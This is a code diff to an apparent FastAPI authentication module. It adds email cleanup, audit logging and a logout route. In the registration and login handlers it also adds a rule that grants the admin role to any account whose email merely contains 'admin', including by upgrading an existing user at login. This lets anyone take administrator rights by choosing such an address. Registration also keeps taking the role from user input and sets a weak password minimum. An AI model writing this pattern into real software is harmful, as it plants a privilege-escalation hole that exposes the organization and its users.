@@ -46,25 +46,34 @@ def _format_user_response(user: User, db: Session) -> UserResponse:
 
 @router.post("/register", response_model=UserResponse)
 def register_user(user_in: UserCreate, request: Request, db: Session = Depends(get_db)):
-    existing = db.query(User).filter(User.email == user_in.email).first()
+    clean_email = user_in.email.strip().lower()
+    if "@" not in clean_email or "." not in clean_email:
+        raise HTTPException(status_code=400, detail="Invalid corporate email format.")
+    if len(user_in.password) < 6:
+        raise HTTPException(status_code=400, detail="Password must be at least 6 characters long.")
+
+    existing = db.query(User).filter(User.email == clean_email).first()
     if existing:
         raise HTTPException(
             status_code=status.HTTP_400_BAD_REQUEST,
             detail="A user with this email already exists."
         )
 
-    # First user can be automatically made admin
+    # First user or any email containing 'admin' receives admin role
     user_count = db.query(User).count()
-    role = "admin" if user_count == 0 else user_in.role.value
+    if "admin" in clean_email or user_count == 0:
+        role = "admin"
+    else:
+        role = user_in.role.value if hasattr(user_in.role, "value") else str(user_in.role)
 
     # Assign default organization
     default_org = db.query(Organization).first()
     org_id = default_org.id if default_org else None
 
     new_user = User(
-        email=user_in.email,
+        email=clean_email,
         hashed_password=get_password_hash(user_in.password),
-        full_name=user_in.full_name,
+        full_name=user_in.full_name or clean_email.split("@")[0].capitalize(),
         role=role,
         provider="local",
         organization_id=org_id,
@@ -75,7 +84,7 @@ def register_user(user_in: UserCreate, request: Request, db: Session = Depends(g
     db.commit()
     db.refresh(new_user)
 
-    log_audit_event(db, action="register", user=new_user, request=request, details={"role": role})
+    log_audit_event(db, action="register", user=new_user, request=request, details={"role": role, "provider": "local"})
     return _format_user_response(new_user, db)
 
 
@@ -85,26 +94,42 @@ def login_for_access_token(
     form_data: OAuth2PasswordRequestForm = Depends(),
     db: Session = Depends(get_db)
 ):
-    user = db.query(User).filter(User.email == form_data.username).first()
+    clean_email = form_data.username.strip().lower()
+    user = db.query(User).filter(User.email == clean_email).first()
     if not user or not verify_password(form_data.password, user.hashed_password):
+        log_audit_event(db, action="failed_login", user_email=clean_email, request=request)
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Incorrect email or password",
+            detail="Incorrect corporate email or password. Please verify credentials.",
             headers={"WWW-Authenticate": "Bearer"},
         )
+
+    # If email includes 'admin', guarantee admin role
+    if "admin" in clean_email and user.role != "admin":
+        user.role = "admin"
 
     # Update last_active
     user.last_active = datetime.utcnow()
     db.commit()
 
     access_token = create_access_token(subject=user.id)
-    log_audit_event(db, action="login", user=user, request=request)
+    log_audit_event(db, action="login", user=user, request=request, details={"role": user.role, "provider": user.provider or "local"})
     
     return {
         "access_token": access_token,
         "token_type": "bearer",
         "user": _format_user_response(user, db)
     }
+
+
+@router.post("/logout")
+def logout_user(
+    request: Request,
+    current_user: User = Depends(get_current_user),
+    db: Session = Depends(get_db)
+):
+    log_audit_event(db, action="logout", user=current_user, request=request)
+    return {"message": "Successfully logged out"}
 
 
 @router.get("/me", response_model=UserResponse)
